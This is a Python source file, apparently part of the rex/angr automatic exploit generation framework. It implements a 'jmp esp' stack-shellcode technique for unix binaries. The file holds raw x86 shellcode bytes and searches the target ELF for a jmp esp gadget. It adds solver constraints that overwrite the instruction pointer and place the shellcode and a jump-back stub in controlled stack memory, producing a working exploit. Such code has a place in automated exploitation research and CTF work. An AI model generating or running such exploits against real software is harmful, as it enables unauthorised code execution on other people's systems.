import logging
from pwn import *
import struct
from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit, NoSuchShellcode
from ..technique import Technique
import copy

l = logging.getLogger("rex.exploit.techniques.CallJmpSPShellcode_unix_read")

class CallJmpSPShellcode_unix_read(Technique):

    name = "READ"

    applicable_to = ['unix']

    def apply(self, **kwargs):

        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            raise CannotExploit("[%s] cannot control ip" % self.name)

        if not self.crash.project.loader.main_bin.execstack:
            raise CannotExploit("[%s] stack is not executable" % self.name)
        


        read_addr = kwargs['read_addr']
        """
            Shellcode from S2E
        """
        exploitReadShellCode_start = "\xeb\x03\x59\xeb\x0e\xe8\xf8\xff\xff\xff\x5b\x52\x65\x73\x75\x6c\x74\x5d\x3a\x31\xc0\x83\xc0\x04\x31\xdb\x43\x89\xc2\x83\xc2\x05\xcd\x80\x31\xc0\x83\xc0\x04\x31\xdb\x43\xb9"
        exploitReadShellCode_end   = "\x89\xc2\xcd\x80\xc3"
        ReadShellCode_real_len = 0x34
        shellcode_read = exploitReadShellCode_start + struct.pack('I',int(read_addr,16)) + exploitReadShellCode_end
        read_shellcode_len = len(shellcode_read)
        exploitWriteShellCode_one = "\xbb" # + exploitWriteShellCodeAddr
        exploitWriteShellCode_two = "\xc7\x03" # + exploitWriteShellCodeValue
        WriteShellCode_three = "\xc3"
        exploitWriteShellCode_real_len = 0xc     
        nop_asm = '\x90'
        
        # use pwntool find jmp esp
        try:
            binary = ELF(self.crash.project.filename)
            jmp_esp = asm('jmp esp')
            jmp_esp_addr = binary.search(jmp_esp).next()   
            if jmp_esp_addr is not None:
                pass
            else:
                # if there's no jmp esp, then exit
                exit(0)   
        except:
            # we are in a thread, just exit, it's fine
            exit(0)  
        glob_control = self._global_control()
        largest_regions = sorted(glob_control.items(),key=operator.itemgetter(1),reverse=True)        
        for region in largest_regions:
            if region[0] > self.crash.state.se.any_int(self.crash.state.regs.esp): #controled region is under esp!
                if region[0] == self.crash.state.se.any_int(self.crash.state.regs.esp) + 4:#controled region is start at esp + 4
                    if region[1] > read_shellcode_len: #region can contain shellcode,then we will choose `jmp esp` way!                      
                        self.crash.state.add_constraints(self.crash.state.ip == jmp_esp_addr)  # add the constraint that the ip must point at the 'jmp sp' stub                      
                        free_space = region[1] - read_shellcode_len
                        shellcode_read = nop_asm * (free_space-1) + shellcode_read
                        read_shellcode_len = len(shellcode_read)
                        shc_constraint = self.crash.state.memory.load(region[0], read_shellcode_len) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)  
                        if not self.crash.state.satisfiable():
                            raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                        
        
                        
            else: #controled region is above esp!
                """
                prepare jmp_back code
                """
                diff_addr = self.crash.state.se.any_int(self.crash.state.regs.esp) - region[0] - 4
                
                if diff_addr >= len(shellcode_read):  
                    jmp_offset_plus_4 = 'jmp $-' + str(0x2 + diff_addr) # plus four to handle EIP's size
                    jmp_offset_plus_4 = asm(jmp_offset_plus_4)
                    jmp_back_len = len(jmp_offset_plus_4)                
                    """
                    add constrain to make sure ret is overwrited by jmp_back code
                    """
                    #self.crash.state.add_constraints(self.crash.state.ip == jmp_esp_addr)
                    constant_jmpesp = self.crash.state.memory.load(self.crash.state.regs.esp - 4,4) == self.crash.state.se.BVV(struct.pack('I',jmp_esp_addr))
                    self.crash.state.add_constraints(constant_jmpesp)
                    
                    constant_jmpback = self.crash.state.memory.load(self.crash.state.regs.esp,jmp_back_len) == self.crash.state.se.BVV(jmp_offset_plus_4)
                    if self.crash.state.se.satisfiable(extra_constraints=(constant_jmpback,)):
                        self.crash.state.add_constraints(constant_jmpback)
                    for addr in range(region[0],region[0]+region[1]):                    
                        shc_constraint = self.crash.state.memory.load(addr, len(shellcode_read)) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)
                            break
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                  
                    if self.crash.state.satisfiable():
                        break
                else:
                    constant_jmpesp = self.crash.state.memory.load(self.crash.state.regs.esp - 4,4) == self.crash.state.se.BVV(struct.pack('I',jmp_esp_addr))
                    self.crash.state.add_constraints(constant_jmpesp)                    

                    for addr in range(self.crash.state.se.any_int(self.crash.state.regs.esp),region[0]+region[1]):                    
                        shc_constraint = self.crash.state.memory.load(addr, len(shellcode_read)) == self.crash.state.se.BVV(shellcode_read)
                        if self.crash.state.se.satisfiable(extra_constraints=(shc_constraint,)):
                            self.crash.state.add_constraints(shc_constraint)
                            break
                    if not self.crash.state.satisfiable():
                        raise CannotExploit("[%s] generated exploit is not satisfiable" % self.name)                  
                    if self.crash.state.satisfiable():
                        break                    
       
        
        return Exploit(self.crash, bypasses_nx=False, bypasses_aslr=True)
